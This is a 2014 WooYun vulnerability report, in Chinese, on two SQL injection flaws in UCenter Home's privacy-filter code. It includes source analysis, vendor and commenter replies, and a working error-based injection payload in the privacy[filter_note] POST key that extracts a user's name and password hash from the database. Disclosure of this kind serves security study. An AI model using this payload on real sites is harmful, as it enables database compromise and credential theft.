{"id": 495, "wybug_id": "wooyun-2014-069672", "wybug_title": "Ucenter Home最新版SQL注入二处", "wybug_corp": "Discuz!", "wybug_author": "xfkxfk", "wybug_date": "2014-07-25 14:16", "wybug_open_date": "2014-10-23 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向公众公开  简要描述： Ucenter Home最新版SQL注入二处 详细说明：  不知道这种情况算不算二次注入先使payload进入数据库或者某一空间内，再次取出payload，然后进入SQL这里第一步操作先使payload进入了一个数组中然后第二步操作中会取出第一步中的payload，然后进入了SQL导致注入整个过程跟二次注入一致，但是没有payload第一次没有进入SQL中不知道这种算不算二次注入，暂且都叫sql注入吧============================================================================下面来看看这个漏洞。在个人设置——隐私筛选——动态筛选文件/source/cp_privacy.php\nelseif(submitcheck('privacy2submit')) {\t//类型筛选\t$space['privacy']['filter_icon'] = array();\tforeach ($_POST['privacy']['filter_icon'] as $key => $value) {\t\t$space['privacy']['filter_icon'][$key] = 1;\t}\t//用户组设置\t$space['privacy']['filter_gid'] = array();\tforeach ($_POST['privacy']['filter_gid'] as $key => $value) {\t\t$space['privacy']['filter_gid'][$key] = intval($value);\t}\t\t//通知筛选\t$space['privacy']['filter_note'] = array();\tforeach ($_POST['privacy']['filter_note'] as $key => $value) {\t\t$space['privacy']['filter_note'][$key] = 1;\t}\t\t\tprivacy_update();\t//更新好友缓存\tfriend_cache($_SGLOBAL['supe_uid']);\tshowmessage('do_success', 'cp.php?ac=privacy&op=view');}\n这里存在两处问题：1、这里在更新类型筛选时将我们key直接为过滤带入了$space['privacy']['filter_icon']中2、这里在更新通知筛选时将我们key直接为过滤带入了$space['privacy']['filter_note']中然后再来看看回到动态筛选页面这里会整理通知内容，以及获取应用名称：文件/source/cp_privacy.php\nif($_GET['op'] == 'view') {\t//好友组\t$groups = getfriendgroup();\t//屏蔽\t$filter_icons = empty($space['privacy']['filter_icon'])?array():$space['privacy']['filter_icon'];\t$filter_note = empty($space['privacy']['filter_note'])?array():$space['privacy']['filter_note'];\t$iconnames = $appids = $icons = $uids = $users = array();\tforeach ($filter_icons as $key => $value) {\t\tlist($icon, $uid) = explode('|', $key);\t\t$icons[$key] = $icon;\t\t$uids[$key] = $uid;\t\tif(is_numeric($icon)) {\t\t\t$appids[$key] = $icon;\t\t}\t}\t//通知整理\tforeach ($filter_note as $key => $value) {\t\tlist($type, $uid) = explode('|', $key);\t\t$types[$key] = $type;\t\t$uids[$key] = $uid;\t\tif(is_numeric($type)) {\t\t\t$appids[$key] = $type;\t\t}\t}\tif($uids) {\t\t$query = $_SGLOBAL['db']->query(\"SELECT uid, username FROM \".tname('space').\" WHERE uid IN (\".simplode($uids).\")\");\t\twhile ($value = $_SGLOBAL['db']->fetch_array($query)) {\t\t\t$users[$value['uid']] = $value['username'];\t\t}\t}\t//获取应用名称\tif($appids) {\t\t$query = $_SGLOBAL['db']->query(\"SELECT appid, appname FROM \".tname('myapp').\" WHERE appid IN (\".simplode($appids).\")\");\t\twhile ($value = $_SGLOBAL['db']->fetch_array($query)) {\t\t\t$iconnames[$value['appid']] = $value['appname'];\t\t}\t}\t\t$cat_actives = array('view' => ' class=\"active\"');}\n在上述代码的开头可以看\n$filter_icons = empty($space['privacy']['filter_icon'])?array():$space['privacy']['filter_icon'];\t$filter_note = empty($space['privacy']['filter_note'])?array():$space['privacy']['filter_note'];\n这里的$space['privacy']['filter_icon']和$space['privacy']['filter_note']就是我们上面privacy2submit提交的内容这里的key是直接传进来的下面再整理通知和获取应用名称时，这里进入了uids和appids数组里面，然后再次进入了SQL语句，造成了SQL注入。   漏洞证明：  第一处SQL注入证明：第一步：首先我们更新通知筛选和类型筛选这里进行通知筛选在个人设置——隐私筛选——动态筛选：\n\n提交一次，抓包，修改POST：添加通知筛选：privacy[filter_note][type|key]：\nprivacy[filter_note][type|key',(select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(username, 0x23, password) from uchome_member limit 0,1))a from information_schema.tables group by a)b))#]\n第二步：再回到在个人设置——隐私筛选——动态筛选这里此时会进行通知整理，然后出发我们的payload，看看结果：\n\n第二处SQL注入证明：同第一处操作一样，但是要注意的是，这里的类型筛选是privacy[filter_icon]，而且此时这里的type必须是整数型。看看提交的内容及结果：\n\n   修复方案：  再进入数据库时，判断处理，过滤，即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-25 16:28 厂商回复： uchome已经停止更新维护，感谢您对我们产品的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-25 14:17 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  1没过    \n     2014-08-27 10:56 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  和这哥们的第二个注射应该又是一样的？ WooYun: Ucenter Home 2.0 SQL注入2枚（最新版）    不知道管理员怎么审核的？@疯狗    \n     2014-10-23 16:31 |    \t\tToySweet \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:8        | 做有道德的安全研究员。)\t\t \n  @pandas 2333333333    \n     2014-10-23 16:42 |    \t\tyinian \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:22        | 代 码 审 计 求 交 流)\t\t \n    6666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}